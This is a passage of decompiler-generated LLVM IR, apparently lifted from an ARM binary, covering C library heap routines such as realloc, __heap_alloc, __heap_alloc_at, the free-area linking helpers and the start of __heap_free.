  %storemerge = phi i32 [ ptrtoint (i32* @global_var_30254.271 to i32), %bb14 ], [ ptrtoint (i32* @global_var_3009c.273 to i32), %bb11 ], [ ptrtoint (i32* @global_var_3009c.273 to i32), %dec_label_pc_13520 ]
  store i32 %storemerge, i32* @r0, align 4
  %v2_13534 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13534, i32* @r4, align 4
  store i32 %v6_134b4, i32* @r5, align 4
  store i32 %v9_134b4, i32* @r6, align 4
  store i32 %v15_134b4, i32* @r8, align 4
  %v0_13538 = call i32 @pthread_mutex_unlock()
  %v0_1353c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1353c

dec_label_pc_1353c:                               ; preds = %dec_label_pc_13500, %dec_label_pc_13534
  %v1_13544 = phi i32 [ %v0_13514, %dec_label_pc_13500 ], [ %v0_1353c.pre, %dec_label_pc_13534 ]
  %v1_1353c = add i32 %v1_13544, 4
  %v2_1353c = inttoptr i32 %v1_1353c to i32*
  %v3_1353c = load i32, i32* %v2_1353c, align 4
  %v2_13540 = icmp eq i32 %v3_1353c, 0
  br i1 %v2_13540, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_1353c
  %v2_13544 = add i32 %v1_13544, 8
  %v3_13544 = inttoptr i32 %v2_13544 to i32*
  %v4_13544 = load i32, i32* %v3_13544, align 4
  %v3_13548 = add i32 %v3_1353c, 8
  %v4_13548 = inttoptr i32 %v3_13548 to i32*
  store i32 %v4_13544, i32* %v4_13548, align 4
  %v0_1354c.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1353c, %bb12
  %v0_1354c = phi i32 [ %v1_13544, %dec_label_pc_1353c ], [ %v0_1354c.pre, %bb12 ]
  %v1_1354c = add i32 %v0_1354c, 8
  %v2_1354c = inttoptr i32 %v1_1354c to i32*
  %v3_1354c = load i32, i32* %v2_1354c, align 4
  %v1_13550 = add i32 %v0_1354c, 4
  %v2_13550 = inttoptr i32 %v1_13550 to i32*
  %v3_13550 = load i32, i32* %v2_13550, align 4
  %v2_13554 = icmp eq i32 %v3_1354c, 0
  br i1 %v2_13554, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_13558 = add i32 %v3_1354c, 4
  %v4_13558 = inttoptr i32 %v3_13558 to i32*
  store i32 %v3_13550, i32* %v4_13558, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_1355c = load i32, i32* @r8, align 4
  %v3_1355c = inttoptr i32 %v2_1355c to i32*
  store i32 %v3_13550, i32* %v3_1355c, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  store i32 ptrtoint (i32* @global_var_3009c.273 to i32), i32* @r0, align 4
  %v1_1356c = call i32 @pthread_mutex_unlock()
  %v0_13570 = load i32, i32* @r6, align 4
  %v1_13570 = load i32, i32* @r4, align 4
  %v0_13578 = load i32, i32* @r5, align 4
  %v2_13570 = sub i32 12, %v0_13570
  %v1_13574 = add i32 %v2_13570, %v1_13570
  %v2_13578 = sub i32 %v1_13574, %v0_13578
  %v1_1357c = call i32 @__GI_sbrk(i32 %v2_13578)
  br label %dec_label_pc_13534

; uselistorder directives
  uselistorder i32 %v0_1354c, { 1, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_30254.271 to i32), { 0, 5, 1, 6, 2, 7, 8, 3, 4 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1353c, { 1, 0 }
  uselistorder label %dec_label_pc_13534, { 2, 1, 0 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_135a0 = load i32, i32* @r4, align 4
  store i32 %v3_135a0, i32* %stack_var_-24, align 4
  %v6_135a0 = load i32, i32* @r5, align 4
  %v9_135a0 = load i32, i32* @r6, align 4
  %v12_135a0 = load i32, i32* @r7, align 4
  %v15_135a0 = load i32, i32* @r8, align 4
  %v18_135a0 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_135a4 = icmp eq i32 %arg2, 0
  %v0_135a8 = load i32, i32* @r0, align 4
  store i32 %v0_135a8, i32* @r7, align 4
  br i1 %v2_135a4, label %dec_label_pc_135b0, label %dec_label_pc_135b8

dec_label_pc_135b0:                               ; preds = %entry
  %v0_135b0 = call i32 @free()
  %v0_135c0.pre = load i32, i32* @r4, align 4
  %v2_135c4.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_135c0

dec_label_pc_135b8:                               ; preds = %entry
  %v2_135b8 = icmp eq i32 %v0_135a8, 0
  br i1 %v2_135b8, label %dec_label_pc_135c0, label %dec_label_pc_135cc

dec_label_pc_135c0:                               ; preds = %dec_label_pc_135b8, %dec_label_pc_135b0
  %v2_135c4 = phi i32 [ %v3_135a0, %dec_label_pc_135b8 ], [ %v2_135c4.pre, %dec_label_pc_135b0 ]
  %v0_135c0 = phi i32 [ %arg2, %dec_label_pc_135b8 ], [ %v0_135c0.pre, %dec_label_pc_135b0 ]
  store i32 %v2_135c4, i32* @r4, align 4
  store i32 %v6_135a0, i32* @r5, align 4
  store i32 %v9_135a0, i32* @r6, align 4
  store i32 %v12_135a0, i32* @r7, align 4
  store i32 %v18_135a0, i32* @lr, align 4
  %v1_135c8 = call i32 @malloc(i32 %v0_135c0)
  %v0_135cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_135cc

dec_label_pc_135cc:                               ; preds = %dec_label_pc_135b8, %dec_label_pc_135c0
  %v0_135e4 = phi i32 [ %v0_135a8, %dec_label_pc_135b8 ], [ %v1_135c8, %dec_label_pc_135c0 ]
  %v0_135cc = phi i32 [ %arg2, %dec_label_pc_135b8 ], [ %v0_135cc.pre, %dec_label_pc_135c0 ]
  %v1_135cc = add i32 %v0_135cc, 7
  %v1_135d0 = and i32 %v1_135cc, -4
  store i32 %v1_135d0, i32* @r5, align 4
  %v2_135d4 = icmp ugt i32 %v1_135d0, 10
  %v1_135d8 = add i32 %v0_135e4, -4
  %v2_135d8 = inttoptr i32 %v1_135d8 to i32*
  %v3_135d8 = load i32, i32* %v2_135d8, align 4
  store i32 %v3_135d8, i32* @r6, align 4
  br i1 %v2_135d4, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_135cc
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_135cc, %bb
  %v0_13660 = phi i32 [ %v1_135d0, %dec_label_pc_135cc ], [ 12, %bb ]
  store i32 %v1_135d8, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_13660, %v3_135d8
  br i1 %tmp, label %dec_label_pc_135ec, label %dec_label_pc_13660

dec_label_pc_135ec:                               ; preds = %bb14
  %v2_135e0 = sub i32 %v0_13660, %v3_135d8
  store i32 %v2_135e0, i32* @r4, align 4
  %v2_135fc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_3009c.273 to i32))
  %v0_13600 = load i32, i32* @r4, align 4
  %v0_13604 = load i32, i32* @r8, align 4
  %v1_13604 = load i32, i32* @r6, align 4
  %v2_13604 = add i32 %v1_13604, %v0_13604
  %v4_1360c = call i32 @__heap_alloc_at(i32* bitcast (i32** @global_var_2b6a4.689 to i32*), i32 %v2_13604, i32 %v0_13600)
  store i32 %v4_1360c, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_3009c.273 to i32), i32* @r0, align 4
  store i32 79396, i32* @lr, align 4
  %v1_13620 = call i32 @pthread_mutex_unlock()
  %v0_13624 = load i32, i32* @r4, align 4
  %v2_13624 = icmp eq i32 %v0_13624, 0
  br i1 %v2_13624, label %dec_label_pc_13634, label %.thread

.thread:                                          ; preds = %dec_label_pc_135ec
  %v1_13628 = load i32, i32* @r6, align 4
  %v3_13628 = add i32 %v1_13628, %v0_13624
  %v2_1362c = load i32, i32* @r7, align 4
  %v3_1362c = add i32 %v2_1362c, -4
  %v4_1362c = inttoptr i32 %v3_1362c to i32*
  store i32 %v3_13628, i32* %v4_1362c, align 4
  br label %dec_label_pc_136a0

dec_label_pc_13634:                               ; preds = %dec_label_pc_135ec
  %v0_13634 = load i32, i32* @r5, align 4
  %v1_13634 = add i32 %v0_13634, -4
  %v1_13638 = call i32 @malloc(i32 %v1_13634)
  store i32 %v1_13638, i32* @r0, align 4
  store i32 %v1_13638, i32* @r4, align 4
  %v2_1363c = icmp eq i32 %v1_13638, 0
  br i1 %v2_1363c, label %dec_label_pc_13658, label %dec_label_pc_13644

dec_label_pc_13644:                               ; preds = %dec_label_pc_13634
  %v0_13644 = load i32, i32* @r6, align 4
  %v1_13644 = add i32 %v0_13644, -4
  store i32 %v1_13644, i32* @r2, align 4
  %v0_13648 = load i32, i32* @r7, align 4
  store i32 %v0_13648, i32* @r1, align 4
  %v0_1364c = call i32 @memcpy()
  %v0_13650 = load i32, i32* @r7, align 4
  store i32 %v0_13650, i32* @r0, align 4
  %v0_13654 = call i32 @free()
  %v0_13658.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13658

dec_label_pc_13658:                               ; preds = %dec_label_pc_13634, %dec_label_pc_13644
  %v0_13658 = phi i32 [ 0, %dec_label_pc_13634 ], [ %v0_13658.pre, %dec_label_pc_13644 ]
  store i32 %v0_13658, i32* @r7, align 4
  br label %dec_label_pc_136a0

dec_label_pc_13660:                               ; preds = %bb14
  %v1_13660 = add i32 %v0_13660, 28
  %tmp15 = icmp ugt i32 %v1_13660, %v3_135d8
  br i1 %tmp15, label %dec_label_pc_136a0, label %dec_label_pc_1366c

dec_label_pc_1366c:                               ; preds = %dec_label_pc_13660
  %v2_13678 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_3009c.273 to i32))
  %v0_1367c = load i32, i32* @r8, align 4
  %v1_1367c = load i32, i32* @r5, align 4
  %v2_1367c = add i32 %v1_1367c, %v0_1367c
  %v1_13680 = load i32, i32* @r6, align 4
  %v2_13680 = sub i32 %v1_13680, %v1_1367c
  %v4_13688 = call i32 @__heap_free(i32* bitcast (i32** @global_var_2b6a4.689 to i32*), i32 %v2_1367c, i32 %v2_13680)
  store i32 ptrtoint (i32* @global_var_3009c.273 to i32), i32* @r0, align 4
  store i32 79516, i32* @lr, align 4
  %v1_13698 = call i32 @pthread_mutex_unlock()
  %v0_1369c = load i32, i32* @r5, align 4
  %v1_1369c = load i32, i32* @r7, align 4
  %v2_1369c = add i32 %v1_1369c, -4
  %v3_1369c = inttoptr i32 %v2_1369c to i32*
  store i32 %v0_1369c, i32* %v3_1369c, align 4
  br label %dec_label_pc_136a0

dec_label_pc_136a0:                               ; preds = %.thread, %dec_label_pc_13660, %dec_label_pc_13658, %dec_label_pc_1366c
  %v0_136a0 = load i32, i32* @r7, align 4
  store i32 %v6_135a0, i32* @r5, align 4
  store i32 %v9_135a0, i32* @r6, align 4
  store i32 %v12_135a0, i32* @r7, align 4
  store i32 %v15_135a0, i32* @r8, align 4
  ret i32 %v0_136a0

; uselistorder directives
  uselistorder i32 %v1_1367c, { 1, 0 }
  uselistorder i32 %v0_13660, { 1, 2, 0 }
  uselistorder i32 %v3_135d8, { 0, 2, 1, 3 }
  uselistorder i32 (i32*, i32, i32)* @__heap_free, { 0, 2, 1 }
  uselistorder i32** @global_var_2b6a4.689, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_3009c.273 to i32), { 9, 2, 10, 3, 11, 0, 1, 4, 12, 5, 13, 14, 6, 15, 7, 16, 8 }
  uselistorder label %dec_label_pc_136a0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_13658, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_135cc, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_136b8 = inttoptr i32 %arg2 to i32*
  %v2_136b8 = load i32, i32* %v1_136b8, align 4
  %v3_136bc = load i32, i32* @r4, align 4
  store i32 %v3_136bc, i32* %stack_var_-8, align 4
  %v1_136c0 = add i32 %v2_136b8, 3
  %v1_136c4 = and i32 %v1_136c0, -4
  store i32 %v1_136c4, i32* @r2, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_136cc = icmp ugt i32 %v1_136c4, 10
  store i32 %tmp, i32* @r1, align 4
  %v2_136d4 = load i32, i32* %arg1, align 4
  store i32 %v2_136d4, i32* %r0.global-to-local, align 4
  br i1 %v2_136cc, label %dec_label_pc_13740.preheader, label %bb

bb:                                               ; preds = %entry
  store i32 12, i32* @r2, align 4
  br label %dec_label_pc_13740.preheader

dec_label_pc_13740.preheader:                     ; preds = %entry, %bb
  %v1_136f4 = phi i32 [ %v1_136c4, %entry ], [ 12, %bb ]
  %v2_137409 = icmp eq i32 %v2_136d4, 0
  br i1 %v2_137409, label %dec_label_pc_13748, label %dec_label_pc_136e0

dec_label_pc_136e0:                               ; preds = %dec_label_pc_13740.preheader, %dec_label_pc_1373c
  %v2_136f8 = phi i32 [ %v3_1373c, %dec_label_pc_1373c ], [ %v2_136d4, %dec_label_pc_13740.preheader ]
  %v1_136e0 = inttoptr i32 %v2_136f8 to i32*
  %v2_136e0 = load i32, i32* %v1_136e0, align 4
  store i32 %v2_136e0, i32* @ip, align 4
  %v3_136e4 = icmp ult i32 %v2_136e0, %v1_136f4
  br i1 %v3_136e4, label %dec_label_pc_1373c, label %dec_label_pc_136ec

dec_label_pc_136ec:                               ; preds = %dec_label_pc_136e0
  %v1_136ec = add i32 %v1_136f4, 44
  %v3_136f0 = icmp ult i32 %v2_136e0, %v1_136ec
  br i1 %v3_136f0, label %dec_label_pc_13700, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_136ec
  %v2_136e4.le = sub i32 %v2_136e0, %v1_136f4
  store i32 %v2_136e4.le, i32* %v1_136e0, align 4
  %v0_1372c.pre = load i32, i32* @ip, align 4
  %v0_13734.pre = load i32, i32* @r2, align 4
  br label %bb29

dec_label_pc_13700:                               ; preds = %dec_label_pc_136ec
  %v1_13700 = add i32 %v2_136f8, 4
  %v2_13700 = inttoptr i32 %v1_13700 to i32*
  %v3_13700 = load i32, i32* %v2_13700, align 4
  %v2_13704 = icmp eq i32 %v3_13700, 0
  br i1 %v2_13704, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_13700
  %v2_13708 = add i32 %v2_136f8, 8
  %v3_13708 = inttoptr i32 %v2_13708 to i32*
  %v4_13708 = load i32, i32* %v3_13708, align 4
  %v3_1370c = add i32 %v3_13700, 8
  %v4_1370c = inttoptr i32 %v3_1370c to i32*
  store i32 %v4_13708, i32* %v4_1370c, align 4
  %v0_13710.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13700, %bb27
  %v0_13710 = phi i32 [ %v2_136f8, %dec_label_pc_13700 ], [ %v0_13710.pre, %bb27 ]
  %v1_13710 = add i32 %v0_13710, 8
  %v2_13710 = inttoptr i32 %v1_13710 to i32*
  %v3_13710 = load i32, i32* %v2_13710, align 4
  %v1_13714 = add i32 %v0_13710, 4
  %v2_13714 = inttoptr i32 %v1_13714 to i32*
  %v3_13714 = load i32, i32* %v2_13714, align 4
  %v2_13718 = icmp eq i32 %v3_13710, 0
  br i1 %v2_13718, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_1371c = add i32 %v3_13710, 4
  %v4_1371c = inttoptr i32 %v3_1371c to i32*
  store i32 %v3_13714, i32* %v4_1371c, align 4
  %v1_13724 = load i32, i32* @ip, align 4
  store i32 %v1_13724, i32* @r2, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_13720 = load i32, i32* @r1, align 4
  %v3_13720 = inttoptr i32 %v2_13720 to i32*
  store i32 %v3_13714, i32* %v3_13720, align 4
  %v1_13728.pre = load i32, i32* @ip, align 4
  store i32 %v1_13728.pre, i32* @r2, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_13734 = phi i32 [ %v0_13734.pre, %.thread._crit_edge ], [ %v1_13724, %bb28 ], [ %v1_13728.pre, %.thread5 ]
  %v0_1372c = phi i32 [ %v0_1372c.pre, %.thread._crit_edge ], [ %v1_13724, %bb28 ], [ %v1_13728.pre, %.thread5 ]
  %v1_1372c = load i32, i32* %r0.global-to-local, align 4
  %v2_1372c = sub i32 %v1_1372c, %v0_1372c
  %v1_13730 = add i32 %v2_1372c, 12
  store i32 %v1_13730, i32* %r0.global-to-local, align 4
  %v1_13734 = load i32, i32* %r4.global-to-local, align 4
  %v2_13734 = inttoptr i32 %v1_13734 to i32*
  store i32 %v0_13734, i32* %v2_13734, align 4
  %v2_13738 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13738, i32* %r4.global-to-local, align 4
  ret i32 %v1_13730

dec_label_pc_1373c:                               ; preds = %dec_label_pc_136e0
  %v1_1373c = add i32 %v2_136f8, 4
  %v2_1373c = inttoptr i32 %v1_1373c to i32*
  %v3_1373c = load i32, i32* %v2_1373c, align 4
  store i32 %v3_1373c, i32* %r0.global-to-local, align 4
  %v2_13740 = icmp eq i32 %v3_1373c, 0
  br i1 %v2_13740, label %dec_label_pc_13740.dec_label_pc_13748_crit_edge, label %dec_label_pc_136e0

dec_label_pc_13740.dec_label_pc_13748_crit_edge:  ; preds = %dec_label_pc_1373c
  br label %dec_label_pc_13748

dec_label_pc_13748:                               ; preds = %dec_label_pc_13740.dec_label_pc_13748_crit_edge, %dec_label_pc_13740.preheader
  store i32 %v3_136bc, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_1373c, { 1, 2, 0 }
  uselistorder i32 %v0_13710, { 1, 0 }
  uselistorder i32 %v2_136e0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_136f8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_136f4, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_136e0, { 1, 0 }
  uselistorder label %dec_label_pc_13740.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_13750 = load i32, i32* %arg1, align 4
  store i32 %v2_13750, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_137c86 = icmp eq i32 %v2_13750, 0
  br i1 %v2_137c86, label %dec_label_pc_137d0, label %dec_label_pc_1375c

dec_label_pc_1375c:                               ; preds = %entry, %dec_label_pc_137c4
  %v0_1379c = phi i32 [ %v3_137c4, %dec_label_pc_137c4 ], [ %v2_13750, %entry ]
  %v1_1375c = inttoptr i32 %v0_1379c to i32*
  %v2_1375c = load i32, i32* %v1_1375c, align 4
  store i32 %v2_1375c, i32* %r0.global-to-local, align 4
  %v2_13760 = sub i32 %v0_1379c, %v2_1375c
  %v1_13764 = add i32 %v2_13760, 12
  %v3_13768 = icmp uge i32 %v1_13764, %arg2
  %v9_13768 = icmp eq i32 %v1_13764, %arg2
  %v2_1376c = xor i1 %v9_13768, true
  %v3_1376c = and i1 %v3_13768, %v2_1376c
  br i1 %v3_1376c, label %dec_label_pc_137c4, label %dec_label_pc_13770

dec_label_pc_13770:                               ; preds = %dec_label_pc_1375c
  br i1 %v9_13768, label %dec_label_pc_13774, label %dec_label_pc_137d0

dec_label_pc_13774:                               ; preds = %dec_label_pc_13770
  %v1_13774 = add i32 %arg3, 3
  %v1_13778 = and i32 %v1_13774, -4
  store i32 %v1_13778, i32* %r2.global-to-local, align 4
  %v2_1377c = sub i32 %v2_1375c, %v1_13778
  %v3_1377c = icmp ult i32 %v2_1375c, %v1_13778
  br i1 %v3_1377c, label %dec_label_pc_137d0, label %dec_label_pc_13784

dec_label_pc_13784:                               ; preds = %dec_label_pc_13774
  %v1_13784 = add i32 %v1_13778, 44
  %v3_13788 = icmp ult i32 %v2_1375c, %v1_13784
  br i1 %v3_13788, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_13784
  store i32 %v2_1377c, i32* %v1_1375c, align 4
  %v1_13794 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_13794, i32* %r0.global-to-local, align 4
  ret i32 %v1_13794

.thread2:                                         ; preds = %dec_label_pc_13784
  %v1_1379c = add i32 %v0_1379c, 4
  %v2_1379c = inttoptr i32 %v1_1379c to i32*
  %v3_1379c = load i32, i32* %v2_1379c, align 4
  store i32 %v3_1379c, i32* %r2.global-to-local, align 4
  %v2_137a0 = icmp eq i32 %v3_1379c, 0
  br i1 %v2_137a0, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_137a4 = add i32 %v0_1379c, 8
  %v3_137a4 = inttoptr i32 %v2_137a4 to i32*
  %v4_137a4 = load i32, i32* %v3_137a4, align 4
  %v3_137a8 = add i32 %v3_1379c, 8
  %v4_137a8 = inttoptr i32 %v3_137a8 to i32*
  store i32 %v4_137a4, i32* %v4_137a8, align 4
  %v0_137ac.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_137ac = phi i32 [ %v0_1379c, %.thread2 ], [ %v0_137ac.pre, %bb17 ]
  %v1_137ac = add i32 %v0_137ac, 8
  %v2_137ac = inttoptr i32 %v1_137ac to i32*
  %v3_137ac = load i32, i32* %v2_137ac, align 4
  store i32 %v3_137ac, i32* %r2.global-to-local, align 4
  %v1_137b0 = add i32 %v0_137ac, 4
  %v2_137b0 = inttoptr i32 %v1_137b0 to i32*
  %v3_137b0 = load i32, i32* %v2_137b0, align 4
  %v2_137b4 = icmp eq i32 %v3_137ac, 0
  br i1 %v2_137b4, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_137b8 = add i32 %v3_137ac, 4
  %v4_137b8 = inttoptr i32 %v3_137b8 to i32*
  store i32 %v3_137b0, i32* %v4_137b8, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_137bc = load i32, i32* %lr.global-to-local, align 4
  %v3_137bc = inttoptr i32 %v2_137bc to i32*
  store i32 %v3_137b0, i32* %v3_137bc, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_137c0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_137c0

dec_label_pc_137c4:                               ; preds = %dec_label_pc_1375c
  %v1_137c4 = add i32 %v0_1379c, 4
  %v2_137c4 = inttoptr i32 %v1_137c4 to i32*
  %v3_137c4 = load i32, i32* %v2_137c4, align 4
  store i32 %v3_137c4, i32* %ip.global-to-local, align 4
  %v2_137c8 = icmp eq i32 %v3_137c4, 0
  br i1 %v2_137c8, label %dec_label_pc_137c8.dec_label_pc_137d0.loopexit_crit_edge, label %dec_label_pc_1375c

dec_label_pc_137c8.dec_label_pc_137d0.loopexit_crit_edge: ; preds = %dec_label_pc_137c4
  br label %dec_label_pc_137d0

dec_label_pc_137d0:                               ; preds = %dec_label_pc_13774, %entry, %dec_label_pc_137c8.dec_label_pc_137d0.loopexit_crit_edge, %dec_label_pc_13770
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_137c4, { 1, 2, 0 }
  uselistorder i32 %v0_137ac, { 1, 0 }
  uselistorder i32 %v1_13778, { 0, 2, 1, 3 }
  uselistorder i1 %v9_13768, { 1, 0 }
  uselistorder i32 %v2_1375c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_1379c, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_137d0, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1375c, { 1, 0 }
}

define i32 @__heap_link_free_area() local_unnamed_addr {
entry:
  %v0_137d8 = load i32, i32* @r2, align 4
  %v2_137d8 = icmp eq i32 %v0_137d8, 0
  %v0_137dc = load i32, i32* @r3, align 4
  %v1_137dc = load i32, i32* @r1, align 4
  %v2_137dc = add i32 %v1_137dc, 4
  %v3_137dc = inttoptr i32 %v2_137dc to i32*
  store i32 %v0_137dc, i32* %v3_137dc, align 4
  %v0_137e0 = load i32, i32* @r2, align 4
  %v1_137e0 = load i32, i32* @r1, align 4
  %v2_137e0 = add i32 %v1_137e0, 8
  %v3_137e0 = inttoptr i32 %v2_137e0 to i32*
  store i32 %v0_137e0, i32* %v3_137e0, align 4
  %v1_137e8 = load i32, i32* @r1, align 4
  br i1 %v2_137d8, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_137e4 = load i32, i32* @r2, align 4
  %v3_137e4 = add i32 %v2_137e4, 4
  %v4_137e4 = inttoptr i32 %v3_137e4 to i32*
  store i32 %v1_137e8, i32* %v4_137e4, align 4
  br label %bb1

.thread:                                          ; preds = %entry
  %v2_137e8 = load i32, i32* @r0, align 4
  %v3_137e8 = inttoptr i32 %v2_137e8 to i32*
  store i32 %v1_137e8, i32* %v3_137e8, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_137ec = load i32, i32* @r3, align 4
  %v2_137ec = icmp eq i32 %v0_137ec, 0
  br i1 %v2_137ec, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_137f0 = load i32, i32* @r1, align 4
  %v3_137f0 = add i32 %v0_137ec, 8
  %v4_137f0 = inttoptr i32 %v3_137f0 to i32*
  store i32 %v1_137f0, i32* %v4_137f0, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_137f4 = load i32, i32* @r0, align 4
  ret i32 %v1_137f4

; uselistorder directives
  uselistorder i32 %v1_137e8, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__heap_link_free_area_after() local_unnamed_addr {
entry:
  %v0_137f8 = load i32, i32* @r2, align 4
  %v2_137f8 = icmp eq i32 %v0_137f8, 0
  %v1_137fc = load i32, i32* @r1, align 4
  br i1 %v2_137f8, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_137fc = load i32, i32* @r0, align 4
  %v3_137fc = inttoptr i32 %v2_137fc to i32*
  store i32 %v1_137fc, i32* %v3_137fc, align 4
  br label %bb2

.thread:                                          ; preds = %entry
  %v3_13800 = add i32 %v0_137f8, 4
  %v4_13800 = inttoptr i32 %v3_13800 to i32*
  store i32 %v1_137fc, i32* %v4_13800, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_13804 = load i32, i32* @r2, align 4
  %v1_13804 = load i32, i32* @r1, align 4
  %v2_13804 = add i32 %v1_13804, 8
  %v3_13804 = inttoptr i32 %v2_13804 to i32*
  store i32 %v0_13804, i32* %v3_13804, align 4
  %v1_13808 = load i32, i32* @r0, align 4
  ret i32 %v1_13808

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1380c = load i32, i32* @r4, align 4
  store i32 %v3_1380c, i32* %stack_var_-20, align 4
  %v2_13810 = load i32, i32* %arg1, align 4
  store i32 %v2_13810, i32* %r4.global-to-local, align 4
  %v2_13814 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_138302 = icmp eq i32 %v2_13810, 0
  br i1 %v2_138302, label %dec_label_pc_138e0, label %dec_label_pc_13820

dec_label_pc_13820:                               ; preds = %entry, %dec_label_pc_13828
  %v0_13870 = phi i32 [ %v0_13878, %dec_label_pc_13828 ], [ 0, %entry ]
  %v0_13878 = phi i32 [ %v3_1382c, %dec_label_pc_13828 ], [ %v2_13810, %entry ]
  %v1_138345.in = phi i32 [ %v3_1382c, %dec_label_pc_13828 ], [ %v2_13810, %entry ]
  %v1_138345 = add i32 %v1_138345.in, 12
  %v3_13820 = icmp ult i32 %v1_138345, %arg2
  br i1 %v3_13820, label %dec_label_pc_13828, label %dec_label_pc_13840

dec_label_pc_13828:                               ; preds = %dec_label_pc_13820
  store i32 %v0_13878, i32* %r6.global-to-local, align 4
  %v1_1382c = add i32 %v0_13878, 4
  %v2_1382c = inttoptr i32 %v1_1382c to i32*
  %v3_1382c = load i32, i32* %v2_1382c, align 4
  store i32 %v3_1382c, i32* %r4.global-to-local, align 4
  %v2_13830 = icmp eq i32 %v3_1382c, 0
  br i1 %v2_13830, label %dec_label_pc_13830.dec_label_pc_138e0.loopexit_crit_edge, label %dec_label_pc_13820

